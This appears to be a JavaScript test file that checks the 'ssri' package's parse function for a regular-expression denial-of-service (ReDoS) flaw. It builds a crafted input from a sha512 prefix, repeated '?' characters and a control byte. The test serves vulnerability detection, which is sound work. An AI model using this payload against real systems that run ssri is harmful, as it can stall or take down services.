const { expectRedos } = require("../utils");

test("ReDos in ssri", () => {
  const ssri = require("ssri");
  expectRedos({
    run: (input) => {
      ssri.parse(input, {
        strict: true,
        single: true,
      });
    },
    build: (n) =>
      "sha512-00000000000000000000000000000000000000000000" +
      "?".repeat(n) +
      "\x1F",
    n: 25,
  });
});
